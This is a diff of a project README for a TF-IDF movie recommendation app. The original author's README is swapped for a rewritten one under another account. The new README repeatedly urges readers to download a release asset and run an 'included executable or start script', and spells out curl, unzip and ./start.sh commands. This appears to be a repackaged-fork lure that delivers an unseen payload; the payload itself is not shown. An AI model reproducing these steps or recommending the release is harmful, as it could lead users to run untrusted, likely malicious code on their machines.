@@ -1,241 +1,176 @@
-# 🎬 Movie Recommendation System
-
-![Streamlit](https://img.shields.io/badge/Streamlit-FF4B4B?style=for-the-badge&logo=Streamlit&logoColor=white)
-![Python](https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white)
-
-An NLP-powered movie recommendation system that suggests similar movies using machine learning and provides detailed movie information with posters and ratings.
-
-![App Screenshot](app_screenshot.jpg)
-
-**[Live Demo - Try it here!](https://movie-recommendation-system-usbi.onrender.com)**
-
-## What This Project Does
-
-Love a movie and want to find similar ones? This app helps you discover your next favorite film!
-
-Simply select any movie and instantly get **5 personalized recommendations** with detailed information including plots, ratings, cast, and movie posters.
-
-Perfect for:
-
-- Finding movies similar to your favorites
-- Discovering new films to watch
-- Learning about movie recommendation algorithms
-- Exploring movie databases and APIs
-
-
-## How It Works
-
-**Simply select a movie:**
-
-- Choose from 1,500+ movies in the dropdown
-- Click "Recommend Similar Movies"
-- Get instant AI-powered suggestions
-- See movie posters, plots, ratings, and cast details
-- All information fetched in real-time from OMDB API
-
-
-## Key Features
-
-- **NLP-Powered Recommendations** - Uses TF-IDF and cosine similarity for accurate suggestions
-- **Rich Movie Information** - Posters, plots, IMDb ratings, cast, and director details
-- **Real-time Data** - Fresh movie information from OMDB API
-- **4,500+ Movies** - Large database of popular films
-- **Instant Results** - Get recommendations in under 2 seconds
-- **Mobile Friendly** - Works perfectly on all devices
-- **No Registration** - Start using immediately
-
-
-## The Machine Learning Model
-
-**How it works:**
-
-- **Content-Based Filtering** - Analyzes movie genres, keywords, overview, and taglines
-- **TF-IDF Vectorization** - Converts text into numerical features (2,000 features)
-- **Cosine Similarity** - Finds movies with similar content patterns
-- **Smart Matching** - Considers plot elements, genres, and movie themes
-
-**What it analyzes:**
-
-- Movie genres (Action, Comedy, Drama, etc.)
-- Plot keywords and themes
-- Movie overviews and descriptions
-- Taglines and promotional text
-
-**Performance:**
-
-- **4,500 movies** processed and analyzed
-- **2,000+ TF-IDF features** for comprehensive text analysis
-- **Instant similarity calculations** using optimized algorithms
-
-
-## Technologies Used
-
-- **Python** - Core programming language
-- **Scikit-learn** - TF-IDF vectorization and cosine similarity
-- **Streamlit** - Interactive web application framework
-- **NLTK** - Text preprocessing and tokenization
-- **OMDB API** - Real-time movie data and posters
-- **Pandas \& NumPy** - Data manipulation and analysis
-- **Hugging Face** - Model storage and deployment
-- **Render** - Cloud hosting platform
-
-
-## Project Structure
-
-```
-Movie-Recommendation-System/
-├── app.py                      # Main Streamlit web application
-├── recommend.py                # Core recommendation engine
-├── omdb_utils.py              # OMDB API integration
-├── preprocess.py              # Data preprocessing pipeline
-├── requirements.txt           # Python dependencies
-├── original_movies_data.csv   # Movie dataset
-├── config_template.json       # API key template
-├── .gitignore                 # Security and cleanup
-└── README.md                  # Project documentation
-```
-
-
-## Model Development Process
-
-**1. Data Preprocessing**
-
-- Started with 4,800+ movie records
-- Cleaned and processed to 1,500 high-quality entries
-- Combined genres, keywords, overviews, and taglines for analysis
-
-**2. Feature Engineering**
-
-- Applied TF-IDF vectorization for text analysis
-- Created 2,000-dimensional feature space
-- Optimized for content-based similarity matching
-
-**3. Similarity Calculation**
-
-- Computed cosine similarity between all movies
-- Built similarity matrix for instant recommendations
-- Optimized for fast real-time predictions
-
-**4. API Integration**
-
-- Connected with OMDB API for real-time movie data
-- Added poster images, ratings, and cast information
-- Implemented fallback handling for missing data
-
-
-## How to Run Locally
-
-1. **Clone the repository**
-```bash
-git clone https://github.com/sankaran-s2001/Movie-Recommendation-System.git
-cd movie-recommendation-system
-```
-
-2. **Install dependencies**
-```bash
-pip install -r requirements.txt
-```
-
-3. **Setup API key**
-
-- Get free API key from [OMDB API](http://www.omdbapi.com/apikey.aspx)
-- Copy `config_template.json` to `config.json`
-- Add your API key to `config.json`
-
-4. **Run preprocessing** (first time only)
-```bash
-python preprocess.py
-```
-
-5. **Start the application**
-```bash
-streamlit run app.py
-```
-
-6. **Open in browser** - Navigate to `http://localhost:8501`
-
-## Real-World Applications
-
-**Simple Use Cases:**
-
-- **Movie Night Planning** - Find films similar to your favorites
-- **Discovery Tool** - Explore new movies in your preferred style
-- **Learning Project** - Understand how recommendation systems work
-- **Entertainment** - Browse and discover movies with rich details
-
-**Examples:**
-
-- Select "Iron Man" → Get "Iron Man 2", "Avengers", "X-Men" recommendations
-- Choose "The Dark Knight" → Discover similar superhero and thriller movies
-- Pick "Titanic" → Find romantic dramas with similar themes
-
-
-## What I Learned Building This
-
-**Technical Skills:**
-
-- **Machine Learning** - Content-based recommendation algorithms
-- **Text Processing** - TF-IDF vectorization and similarity calculations
-- **API Integration** - Real-time data fetching from external services
-- **Web Development** - Building interactive applications with Streamlit
-- **Cloud Deployment** - Model storage on Hugging Face and hosting on Render
-
-**Data Science Skills:**
-
-- **Feature Engineering** - Combining multiple text fields for better recommendations
-- **Model Optimization** - Memory-efficient processing for cloud deployment
-- **Data Pipeline** - End-to-end system from raw data to web application
-- **Performance Tuning** - Optimizing for fast response times
-
-**Problem-Solving Skills:**
-
-- **Memory Management** - Solved deployment memory issues with smart model storage
-- **API Design** - Created clean interfaces between different system components
-- **User Experience** - Designed intuitive interface for movie selection and results
-
-
-## Technical Achievements
-
-- **Efficient Algorithm** - Fast similarity calculations for 1,500+ movies
-- **Cloud Deployment** - Successfully deployed with Hugging Face model storage
-- **Real-time Integration** - Live movie data with posters and details
-- **Memory Optimization** - Solved deployment constraints with smart architecture
-- **Professional UI** - Clean, responsive interface with rich movie information
-
-
-## Architecture Highlights
-
-**Smart Model Storage:**
-
-- Models stored on Hugging Face for efficient deployment
-- Automatic download and caching on first use
-- Eliminates memory issues during preprocessing
-
-**API Integration:**
-
-- Real-time movie data from OMDB API
-- Robust error handling for missing information
-- Rich content display with posters and metadata
-
-
-## Future Improvements
-
-- Add user rating and review integration
-- Implement collaborative filtering for personalized recommendations
-- Include movie trailers and streaming platform availability
-- Add recommendation explanation features
-- Create user profiles for recommendation history
-- Expand database to include TV shows and documentaries
-
-
-## ✉️ Contact
-
-**Sankaran S**  
-[![GitHub](https://img.shields.io/badge/GitHub-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sankaran-s2001)  
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/sankaran-s21/)  
-[![Email](https://img.shields.io/badge/Email-D14836?style=for-the-badge&logo=gmail&logoColor=white)](mailto:sankaran121101@gmail.com)
-
-*This project demonstrates how machine learning can power intelligent recommendation systems. Built to showcase data science skills and create a practical tool for movie discovery.*
-
-⭐ **If you find this project helpful, please star it!**
-
+# NLP Movie Recommender — TF‑IDF + Cosine Similarity, Streamlit UI
+
+[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/Logan222nnn/Movie-Recommendation-System/releases) [![Python](https://img.shields.io/badge/python-3.8%2B-blue)](https://www.python.org/) [![Streamlit](https://img.shields.io/badge/streamlit-yes-red)](https://streamlit.io/) [![TF-IDF](https://img.shields.io/badge/tfidf-vectorizer-orange)](https://scikit-learn.org/stable/modules/feature_extraction.html#tfidf)
+
+![Movie Recommender Illustration](https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Font_Awesome_5_solid_film.svg/800px-Font_Awesome_5_solid_film.svg.png)
+
+A compact NLP system that recommends movies by comparing plot and metadata using TF‑IDF vectors and cosine similarity. It fetches real metadata from the OMDB API and runs in a Streamlit UI for real‑time interaction.
+
+Releases: Download the packaged release asset from the Releases page, then run the included executable or start script. Get it here: https://github.com/Logan222nnn/Movie-Recommendation-System/releases
+
+Features
+- Content-based recommendations using TF‑IDF vectorizer.
+- Cosine similarity for ranked nearest matches.
+- Real-time OMDB API lookups for up-to-date movie info.
+- Streamlit app for quick demos and local use.
+- Jupyter notebooks for exploration and model tuning.
+- Optional Hugging Face text embeddings for improved recommendations.
+- Deploy-ready configuration for Render or similar hosts.
+
+Why this repo
+- Focuses on readable code and simple NLP tools.
+- Uses standard Python libraries so you can extend components.
+- Designed for experiments with TF‑IDF weighting, n-grams, and metadata fusion.
+
+Demo image
+![UI Screenshot](https://raw.githubusercontent.com/Logan222nnn/Movie-Recommendation-System/main/docs/ui-screenshot.png)
+
+Quick links
+- Code: the repository root holds the Streamlit app and notebooks.
+- Releases: download the packaged release, run it to launch the app — https://github.com/Logan222nnn/Movie-Recommendation-System/releases
+
+Getting started (local)
+1. Clone the repo:
+   - git clone https://github.com/Logan222nnn/Movie-Recommendation-System.git
+2. Create and activate a virtualenv:
+   - python -m venv venv
+   - source venv/bin/activate  (macOS / Linux)
+   - venv\Scripts\activate     (Windows)
+3. Install dependencies:
+   - pip install -r requirements.txt
+4. Set your OMDB API key:
+   - export OMDB_API_KEY="your_key"  (macOS / Linux)
+   - set OMDB_API_KEY="your_key"     (Windows)
+5. Run the Streamlit app:
+   - streamlit run app.py
+
+Run from release (packaged)
+- Visit the Releases page and download the latest asset. The release contains a runnable package or start script. After download, execute the packaged file to start the app.
+- Example (when the asset is a zip):
+  - unzip movie-recommender-release.zip
+  - cd movie-recommender-release
+  - ./start.sh  or  streamlit run app.py
+
+Project structure
+- app.py — Streamlit front-end and entrypoint.
+- recommender/ — core logic (tfidf vectorizer, similarity).
+- notebooks/ — EDA and tuning notebooks.
+- requirements.txt — pinned Python libs.
+- Dockerfile — build container for deployment.
+- tests/ — unit tests for core functions.
+- docs/ — screenshots and diagrams.
+
+How the recommender works
+- Text collection:
+  - The system collects plots, genres, cast, and keywords.
+  - It composes a single text field per movie that blends those features.
+- TF‑IDF:
+  - The code uses scikit-learn's TfidfVectorizer.
+  - You can tune n-grams, min_df, and max_df to change recall vs precision.
+- Cosine similarity:
+  - The system computes cosine similarity on the TF‑IDF matrix.
+  - It ranks movies by similarity to the input movie or query text.
+- OMDB integration:
+  - The app calls OMDB for fresh metadata on demand.
+  - The system caches results to limit API calls and speed responses.
+- Optional embeddings:
+  - You can swap TF‑IDF for transformer embeddings via Hugging Face.
+  - The repo shows how to plug in sentence-transformers for semantically richer matches.
+
+Key algorithms and code notes
+- Vectorizer initialization:
+  - TfidfVectorizer(ngram_range=(1,2), max_features=30_000, stop_words='english')
+- Similarity:
+  - Use sklearn.metrics.pairwise.cosine_similarity or sparse dot products for scale.
+- Fusion:
+  - Combine text score with metadata weight (genre overlap, year proximity).
+  - Weighted sum: score = alpha * text_score + beta * genre_score + gamma * cast_score.
+- Preprocessing:
+  - Lowercase, strip punctuation, expand common contractions only when helpful.
+  - Avoid aggressive stemming; keep tokens readable for TF‑IDF.
+
+Examples of use
+- Find movies similar to "Inception" by plot:
+  - Type "Inception" in the app. The system fetches plot from OMDB and returns ranked matches.
+- Recommend titles by short description:
+  - Paste a two-sentence plot. The system vectorizes the text and finds close titles.
+- Batch suggestions:
+  - Upload a CSV of movie titles. The notebook shows batch processing and pairwise similarity.
+
+OMDB API integration
+- You need an OMDB API key to fetch real data.
+- Set OMDB_API_KEY in your environment.
+- The app uses titles to fetch IMDb ID, plot, year, genre, and poster.
+- The repo caches responses in ./cache/ with a simple JSON store.
+
+Deployment notes
+- Streamlit hosting:
+  - Deploy on Render or Streamlit Cloud.
+  - Use the provided Dockerfile or requirements.txt for builds.
+- Render example:
+  - Use the same startup command as local: streamlit run app.py
+  - Add OMDB_API_KEY as an environment variable in the service settings.
+- Release packaging:
+  - The Releases page hosts a packaged version for direct use. Download the asset and execute the included start script.
+
+Releases and packaged builds
+- The release assets include a ready package and a start script. Download the asset and run the script to launch the app. Access the release bundle here: https://github.com/Logan222nnn/Movie-Recommendation-System/releases
+- Example download commands:
+  - curl -L -o movie-recommender.zip "https://github.com/Logan222nnn/Movie-Recommendation-System/releases/download/v1.0/movie-recommender.zip"
+  - unzip movie-recommender.zip
+  - ./start.sh
+
+Files to check first
+- app.py — main UI.
+- recommender/tfidf_recommender.py — core TF‑IDF logic.
+- notebooks/01-data-explore.ipynb — data flow overview and examples.
+- requirements.txt — install list.
+- Dockerfile — container configuration.
+
+Customization pointers
+- Change ngram_range for broader phrase matching.
+- Increase max_features to capture more rare terms.
+- Add domain-specific stop words to remove noise.
+- Use hugging-face embeddings:
+  - Replace TF‑IDF vectorizer with a sentence-transformer model.
+  - Use cosine similarity on dense vectors.
+- Blend metadata:
+  - Weighted scoring helps bring genre and era relevance.
+
+Testing and validation
+- Unit tests cover vector creation and similarity ranking.
+- Use the notebooks to validate relevancy on curated test sets.
+- Evaluate by precision@k for human-labeled similarity pairs.
+
+Contributing
+- Fork the repo and open pull requests for features and fixes.
+- Keep changes small and focused.
+- Run tests before submitting.
+- Update notebooks when you change model behavior.
+
+Roadmap ideas
+- Add collaborative filtering hybrid with user ratings.
+- Add user session tracking in the Streamlit app for history and feedback.
+- Add more data sources (TMDb, IMDb bulk data).
+- Add pairwise human feedback loop to fine-tune weights.
+
+Acknowledgements and resources
+- OMDB API — for movie metadata.
+- scikit-learn — TF‑IDF and similarity utilities.
+- Streamlit — easy UI for small apps.
+- Hugging Face — optional embeddings and transformer models.
+
+License
+- MIT License (see LICENSE file).
+
+Contact
+- Open issues or PRs on GitHub for bugs and feature requests.
+
+Badges and links
+[![Download Release](https://img.shields.io/badge/Download%20Release-%20Get%20asset-blue?logo=github)](https://github.com/Logan222nnn/Movie-Recommendation-System/releases)
+
+Credits
+- UI mockups: community assets and placeholder images.
+- Example data: synthetic and public metadata for demo.
+
+Enjoy exploring recommendations.
